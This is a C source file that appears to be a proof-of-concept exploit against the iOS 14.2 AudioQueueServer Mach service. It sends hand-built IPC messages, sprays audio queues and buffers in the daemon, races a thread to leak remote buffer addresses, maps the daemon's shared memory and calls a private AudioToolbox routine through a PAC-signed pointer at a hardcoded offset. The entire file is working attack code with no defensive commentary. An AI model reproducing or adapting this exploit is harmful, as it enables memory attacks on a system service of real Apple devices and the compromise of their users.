#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <mach-o/dyld.h>
#include <mach-o/dyld_images.h>
#include <mach-o/loader.h>
#include <mach/mach.h>

#include "audio_queue.h"
#include "utils/mem_util.h"
#include "utils/pac.h"

extern kern_return_t bootstrap_look_up(mach_port_t, const char *, mach_port_t *);
extern kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t *address, mach_vm_size_t size,
                                 mach_vm_offset_t mask, int flags, mem_entry_name_port_t object,
                                 memory_object_offset_t offset, boolean_t copy, vm_prot_t cur_protection,
                                 vm_prot_t max_protection, vm_inherit_t inheritance);

static kern_return_t fetch_mach_service_port(const char *service_name, mach_port_name_t *service_port) {

    mach_port_t bs_port = MACH_PORT_NULL;

    kern_return_t kr = task_get_bootstrap_port(mach_task_self(), &bs_port);
    if (kr != KERN_SUCCESS) {
        printf("[-] Get bootstrap port failed: %s\n", mach_error_string(kr));
        return kr;
    }

    kr = bootstrap_look_up(bs_port, service_name, service_port);
    if (kr != KERN_SUCCESS) {
        printf("[-] bootstrap_look_up failed: %s\n", mach_error_string(kr));
    } else {
        printf("[+] service_port[%s] = 0x%x\n", service_name, *service_port);
    }
    return kr;
}


mach_msg_return_t aq_queue_dispose(mach_port_t service, uint32_t queue_id) {

    typedef struct aq_queue_dispose_request_s aq_queue_dispose_request_t;
    typedef struct aq_queue_dispose_reply_s aq_queue_dispose_reply_t;

#pragma pack(4)
    struct aq_queue_dispose_request_s {
        mach_msg_header_t header;
        NDR_record_t NDR;
        uint32_t queue_object;
        uint32_t unk1;
    };
#pragma pack(0)

#pragma pack(4)
    struct aq_queue_dispose_reply_s {
        mach_msg_header_t header;
        NDR_record_t NDR;
        mach_msg_return_t ret_code;
        mach_msg_trailer_t trailer;
    };
#pragma pack(0)

    union {
        aq_queue_dispose_request_t request;
        aq_queue_dispose_reply_t reply;
    } message;

    memset(&message, 0, sizeof(message));

    aq_queue_dispose_request_t *request = &message.request;
    aq_queue_dispose_reply_t *reply = &message.reply;

    request->header.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    request->header.msgh_size = sizeof(*request);
    request->header.msgh_remote_port = service;
    request->header.msgh_local_port = mig_get_reply_port();
    request->header.msgh_voucher_port = 0x00;
    request->header.msgh_id = 9802;

    request->NDR = NDR_record;
    request->queue_object = queue_id;
    request->unk1 = 0x41414141;

    mach_msg_return_t ret =
           mach_msg(&request->header, MACH_SEND_MSG | MACH_RCV_MSG | MACH_MSG_OPTION_NONE,
                    (mach_msg_size_t)sizeof(*request), (mach_msg_size_t)sizeof(*reply),
                    request->header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

    if (ret != KERN_SUCCESS || reply->ret_code != KERN_SUCCESS) {
        printf("[-] Dispose queue failed: %s\n", ret ? mach_error_string(ret) : mach_error_string(reply->ret_code));
        return ret;
    }
    return 0;
}

mach_msg_return_t aq_allocate_buffer(mach_port_t service, uint32_t queue_id, mach_port_t *memory_entry,
                                     uint64_t *start) {

    typedef struct aq_allocate_buffer_request_s aq_allocate_buffer_request_t;
    typedef struct aq_allocate_buffer_reply_s aq_allocate_buffer_reply_t;

#pragma pack(4)
    struct aq_allocate_buffer_request_s {
        mach_msg_header_t header;
        NDR_record_t NDR;
        uint32_t queue_id;
        uint64_t unk1;
        uint32_t unk2;  // capacity
        uint64_t unk3;
        uint32_t unk4;
    };
#pragma pack(0)

#pragma pack(4)
    struct aq_allocate_buffer_reply_s {
        mach_msg_header_t header;
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t port;
        NDR_record_t NDR;
        uint32_t buffer_id;
        uint64_t unk2;
        uint64_t unk3;
        mach_msg_trailer_t trailer;
    };
#pragma pack(0)

    union {
        aq_allocate_buffer_request_t request;
        aq_allocate_buffer_reply_t reply;
    } message;

    memset(&message, 0, sizeof(message));

    aq_allocate_buffer_request_t *request = &message.request;
    aq_allocate_buffer_reply_t *reply = &message.reply;

    request->header.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    request->header.msgh_size = sizeof(*request);
    request->header.msgh_remote_port = service;
    request->header.msgh_local_port = mig_get_reply_port();
    request->header.msgh_voucher_port = 0x00;
    request->header.msgh_id = 9803;

    request->queue_id = queue_id;
    request->unk1 = 0;
    request->unk2 = 0x80000000;
    request->unk3 = 0x00;
    request->unk4 = 0x08000400;

    mach_msg_return_t ret = mach_msg(&request->header, MACH_SEND_MSG | MACH_RCV_MSG | MACH_MSG_OPTION_NONE,
                                     (mach_msg_size_t)sizeof(*request), (mach_msg_size_t)sizeof(*reply),
                                     request->header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

    if (ret != KERN_SUCCESS || reply->header.msgh_size != 68) {
        ret = ret ? ret : *(uint32_t *)((char *)reply + 0x20);
        printf("[-] Allocate buffer failed: 0x%x %s\n", ret, mach_error_string(ret));
        return ret;
    }
    printf("[*] Allocate buffer succeed, start: 0x%llx\n", reply->unk2);

    if (memory_entry) *memory_entry = reply->port.name;
    if (start) *start = reply->unk2;

    return 0;
}

mach_msg_return_t aq_allocate_buffer_with_size(mach_port_t service, uint32_t queue_id, uint32_t size1, uint32_t size2,
                                               mach_port_t *memory_entry, uint64_t *start) {

    typedef struct aq_allocate_buffer_request_s aq_allocate_buffer_request_t;
    typedef struct aq_allocate_buffer_reply_s aq_allocate_buffer_reply_t;

#pragma pack(4)
    struct aq_allocate_buffer_request_s {
        mach_msg_header_t header;
        NDR_record_t NDR;
        uint32_t queue_id;
        uint64_t unk1;
        uint32_t unk2;  // capacity
        uint64_t unk3;
        uint32_t unk4;
    };
#pragma pack(0)

#pragma pack(4)
    struct aq_allocate_buffer_reply_s {
        mach_msg_header_t header;
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t port;
        NDR_record_t NDR;
        uint32_t buffer_id;
        uint64_t unk2;
        uint64_t unk3;
        mach_msg_trailer_t trailer;
    };
#pragma pack(0)

    union {
        aq_allocate_buffer_request_t request;
        aq_allocate_buffer_reply_t reply;
    } message;

    memset(&message, 0, sizeof(message));

    aq_allocate_buffer_request_t *request = &message.request;
    aq_allocate_buffer_reply_t *reply = &message.reply;

    request->header.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    request->header.msgh_size = sizeof(*request);
    request->header.msgh_remote_port = service;
    request->header.msgh_local_port = mig_get_reply_port();
    request->header.msgh_voucher_port = 0x00;
    request->header.msgh_id = 9803;

    request->queue_id = queue_id;
    request->unk1 = 0;
    request->unk2 = size1;
    request->unk3 = 0x00;
    request->unk4 = size2;

    mach_msg_return_t ret = mach_msg(&request->header, MACH_SEND_MSG | MACH_RCV_MSG | MACH_MSG_OPTION_NONE,
                                     (mach_msg_size_t)sizeof(*request), (mach_msg_size_t)sizeof(*reply),
                                     request->header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

    if (ret != KERN_SUCCESS || reply->header.msgh_size != 68) {
        ret = ret ? ret : *(uint32_t *)((char *)reply + 0x20);
        printf("[-] Allocate buffer failed: 0x%x %s\n", ret, mach_error_string(ret));
        return ret;
    }
    // printf("[*] Allocate buffer succeed, start: 0x%llx\n", reply->unk2);

    if (memory_entry) *memory_entry = reply->port.name;
    if (start) *start = reply->unk2;

    return 0;
}
mach_msg_return_t aq_new_queue(mach_port_t service, mach_port_t port, uint32_t *queue_id, mach_vm_address_t *address,
                               uint32_t session) {
    typedef struct aq_new_queue_request_s aq_new_queue_request_t;
    typedef struct aq_new_queue_reply_s aq_new_queue_reply_t;

#pragma pack(4)
    struct aq_new_queue_request_s {
        mach_msg_header_t header;
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t port;
        NDR_record_t NDR;
        uint32_t unk1;
        uint32_t unk2;
        char unk[44];
        uint32_t session;
    };
#pragma pack(0)

#pragma pack(4)
    struct aq_new_queue_reply_s {
        mach_msg_header_t header;
        NDR_record_t NDR;
        mach_msg_return_t ret_code;
        uint32_t object_id;  // owner
        uint64_t audio_queue;
        mach_msg_trailer_t trailer;
    };
#pragma pack(0)

    union {
        aq_new_queue_request_t request;
        aq_new_queue_reply_t reply;
    } message;
    memset(&message, 0x00, sizeof(message));

    aq_new_queue_request_t *request = &message.request;
    aq_new_queue_reply_t *reply = &message.reply;

    request->header.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE) | MACH_MSGH_BITS_COMPLEX;
    request->header.msgh_size = sizeof(*request);
    request->header.msgh_remote_port = service;
    request->header.msgh_local_port = mig_get_reply_port();
    request->header.msgh_voucher_port = 0x00;
    request->header.msgh_id = 9801;

    request->msgh_body.msgh_descriptor_count = 1;

    request->port.disposition = MACH_MSG_TYPE_MAKE_SEND;
    request->port.name = port;
    request->port.type = MACH_MSG_PORT_DESCRIPTOR;

    request->NDR = NDR_record;

    memset(request->unk, 0x41, sizeof(request->unk));
    request->unk1 = 0x73616D72;
    request->unk2 = 0x41414141;

    request->session = session;

    mach_msg_return_t ret = mach_msg(&request->header, MACH_SEND_MSG | MACH_RCV_MSG | MACH_MSG_OPTION_NONE,
                                     (mach_msg_size_t)sizeof(*request), (mach_msg_size_t)sizeof(*reply),
                                     request->header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

    if (ret != KERN_SUCCESS || reply->ret_code != KERN_SUCCESS) {
        ret = ret ? ret : reply->ret_code;
        printf("[-] Create new queue failed: %s 0x%x\n", mach_error_string(ret), ret);
        return ret;
    }

    printf("[*] new queue: 0x%x 0x%llx\n", reply->object_id, reply->audio_queue);

    if (queue_id) *queue_id = reply->object_id;
    if (address) *address = reply->audio_queue;

    return 0;
}

void init(aq_context_t *context) {

    uint64_t audio_toolbox_base = 0x00;

    for (uint32_t i = 0; i < _dyld_image_count(); i++) {
        uint64_t addr = (uint64_t)_dyld_get_image_header(i);
        const char *name = _dyld_get_image_name(i);
        if (strncmp(name, "/System/", sizeof("/System/") - 1) && strncmp(name, "/usr/", sizeof("/usr/") - 1)) continue;
        if (!strcmp("/System/Library/Frameworks/AudioToolbox.framework/AudioToolbox", name)) audio_toolbox_base = addr;
    }

#define iOS_14_2_ARM64e

#ifdef iOS_14_2_ARM64e
    context->allocate_buffer_fn = (allocate_buffer_fn_t)paciza(audio_toolbox_base + 0x1B0C38);
#endif

    // printf("[*] audio_toolbox_base: 0x%llx\n", audio_toolbox_base);
}

/* MACROS from AudioToolbox/AudioToolbox.h */
#define T_SAMPLE int16_t
#define SAMPLING_RATE 20000
#define NUMBER_CHANNELS 1
#define BITS_PER_CHANNEL (sizeof(T_SAMPLE) * 8)
#define BYTES_PER_FRAME (NUMBER_CHANNELS * sizeof(T_SAMPLE))
#define FRAME_SIZE 0x8000

static void aq_input_callback(void *in_user_data, AudioQueueRef in_aq, AudioQueueBufferRef in_buffer,
                              const AudioTimeStamp *in_start_time, UInt32 in_number_packet_descriptions,
                              const AudioStreamPacketDescription *in_packet_descs) {

    printf("[*] In data: %p\n", in_buffer->mAudioData);
    AudioQueueEnqueueBuffer(in_aq, in_buffer, 0, NULL);
}

typedef struct th_allocate_buffer_args_s th_allocate_buffer_args_t;
struct th_allocate_buffer_args_s {
    uint64_t sp;
    uint64_t start;  // sp - 0xc0 + 52
    uint64_t end;    // sp - 0xc0 + 60
};

void *th_allocate_buffer(void *arg) {
    th_allocate_buffer_args_t *th_arg = (th_allocate_buffer_args_t *)arg;
    uint64_t start = 0, end = 0;
    while (1) {
        start = *(uint64_t *)(th_arg->sp - 0xC0 + 52);
        end = *(uint64_t *)(th_arg->sp - 0xC0 + 60);
        if ((end - start) == 0x10000000) break;
    }
    th_arg->start = start;
    th_arg->end = end;
    printf("[*] Allocated remote address found, start: 0x%llx end: 0x%llx\n", start, end);

    return NULL;
}

void AudioQueueAllocateBufferEx(aq_context_t *aq_context, AudioQueueRef queue, uint32_t frame_size, uint32_t desc_size,
                                AudioQueueBufferRef *audio_queue_buffer) {

    uint64_t current_sp = 0x00;
    __asm__ __volatile__("MOV %0, SP" : "=r"(current_sp) : :);

    th_allocate_buffer_args_t th_args = {
        .sp = current_sp,
        .start = 0x00,
        .end = 0x00,
    };

    pthread_t thread_allocate;
    pthread_create(&thread_allocate, NULL, th_allocate_buffer, &th_args);
    aq_context->allocate_buffer_fn((uint64_t)queue, 0, frame_size, 0, desc_size, audio_queue_buffer, 1);

    aq_allocate_buffer(aq_context->audio_queue_service_port, aq_context->assist.queue_id,
                       &aq_context->assist.shared_mem_entry, &aq_context->assist.remote_start);

    pthread_join(thread_allocate, NULL);

    aq_context->current_stat.remote_start = th_args.start;

    aq_context->assist.local_start = 0x180000000;
    kern_return_t kr = mach_vm_map(mach_task_self(), &aq_context->assist.local_start, 0x4000, 0, VM_FLAGS_ANYWHERE,
                                   aq_context->assist.shared_mem_entry, 0, FALSE, VM_PROT_READ | VM_PROT_WRITE,
                                   VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
    if (kr != KERN_SUCCESS) {
        printf("[-] mach_vm_map() failed: %s\n", mach_error_string(kr));
        return;
    }

    printf("[*] Local start of the shared allocated buffer: 0x%llx\n", aq_context->assist.local_start);
}

void allocate_spray_queues(aq_context_t *aq_context) {
    mach_port_t spray_port = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &spray_port);
    for (size_t i = 0; i < SPRAY_CONTEXT_QUEUE_COUNT_MAX; i++) {
        aq_new_queue(aq_context->audio_queue_service_port, spray_port, &aq_context->spray_context.queues[i].queue_id,
                     &aq_context->spray_context.queues[i].queue, 0x42424242);
    }
}

void dump_segments(aq_context_t *aq_context) {
    uint64_t *queues = malloc(sizeof(uint64_t) * SPRAY_CONTEXT_QUEUE_COUNT_MAX);
    assert(queues != NULL);
    uint64_t *buffers = malloc(sizeof(uint64_t) * SPRAY_CONTEXT_QUEUE_COUNT_MAX * SPRAY_CONTEXT_QUEUE_BUFFER_COUNT);
    assert(buffers != NULL);

    for (size_t i = 0; i < SPRAY_CONTEXT_QUEUE_COUNT_MAX; i++) {
        queues[i] = aq_context->spray_context.queues[i].queue;
        for (size_t j = 0; j < SPRAY_CONTEXT_QUEUE_BUFFER_COUNT; j++) {
            buffers[i * SPRAY_CONTEXT_QUEUE_COUNT_MAX + j] = aq_context->spray_context.queues[i].buffer[j];
        }
    }
    printf("\n");
    printf("Media Queues Segments:\n");
    merge_mem_segments(queues, SPRAY_CONTEXT_QUEUE_COUNT_MAX, 0x800);

    printf("\n\n");
    printf("Media Buffers Segments:\n");
    merge_mem_segments(buffers, SPRAY_CONTEXT_QUEUE_COUNT_MAX * SPRAY_CONTEXT_QUEUE_BUFFER_COUNT, 0x40000);
    printf("\n\n");
}

void allocate_spray_queues_buffer(aq_context_t *aq_context) {
    for (size_t i = 0; i < SPRAY_CONTEXT_QUEUE_COUNT_MAX; i++) {
        for (size_t j = 0; j < SPRAY_CONTEXT_QUEUE_BUFFER_COUNT; j++)
            aq_allocate_buffer_with_size(aq_context->audio_queue_service_port,
                                         aq_context->spray_context.queues[i].queue_id, 0x80000000, 0x08004000, NULL,
                                         &aq_context->spray_context.queues[i].buffer[j]);
    }
    dump_segments(aq_context);
}

#ifndef CONSOLE
int aq_go() {
#else
int main() {
#endif /* CONSOLE */

    aq_context_t aq_context;
    memset(&aq_context, 0, sizeof(aq_context));

    mach_port_t audio_queue_server_service = MACH_PORT_NULL;
    fetch_mach_service_port("com.apple.audio.AudioQueueServer", &audio_queue_server_service);
    aq_context.audio_queue_service_port = audio_queue_server_service;

    init(&aq_context);

    allocate_spray_queues(&aq_context);

    mach_port_t assis_port = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &assis_port);
    aq_new_queue(aq_context.audio_queue_service_port, assis_port, &aq_context.assist.queue_id, NULL, 0x42424242);

    AudioQueueRef queue = NULL;
    AudioStreamBasicDescription format;
    memset(&format, 0, sizeof(format));
    format.mSampleRate = SAMPLING_RATE;
    format.mFormatID = kAudioFormatLinearPCM;
    format.mFormatFlags = kLinearPCMFormatFlagIsSignedInteger | kLinearPCMFormatFlagIsPacked;
    format.mFramesPerPacket = 1;
    format.mChannelsPerFrame = NUMBER_CHANNELS;
    format.mBitsPerChannel = BITS_PER_CHANNEL;
    format.mBytesPerPacket = BYTES_PER_FRAME;
    format.mBytesPerFrame = BYTES_PER_FRAME;
    AudioQueueNewInput(&format, aq_input_callback, NULL, NULL, kCFRunLoopCommonModes, 0, &queue);

    AudioQueueBufferRef audio_queue_buffer = NULL;
    AudioQueueAllocateBufferEx(&aq_context, queue, 0x10000000, 0x0f000400, &audio_queue_buffer);
    AudioQueueEnqueueBuffer(queue, audio_queue_buffer, 0, NULL);

    if ((aq_context.assist.remote_start - aq_context.current_stat.remote_start) == 0x4000) {

        allocate_spray_queues_buffer(&aq_context);
        //aq_queue_dispose(audio_queue_server_service, aq_context.assist.queue_id);
        
        printf("[*] Now we come here...\n");
        memset((char *)aq_context.assist.local_start, 0, 0x4000);
        AudioQueueStart(queue, NULL);

        printf("[*] Already started...\n");
        do {
            uint64_t value = *(uint64_t *)(aq_context.assist.local_start + 0x00);
            if (value) {
                printf("[*] value = 0x%llx\n", value);
                break;
            }
        } while (1);
    }

    // mach_port_deallocate(mach_task_self(), audio_queue_server_service);

    return 0;
}
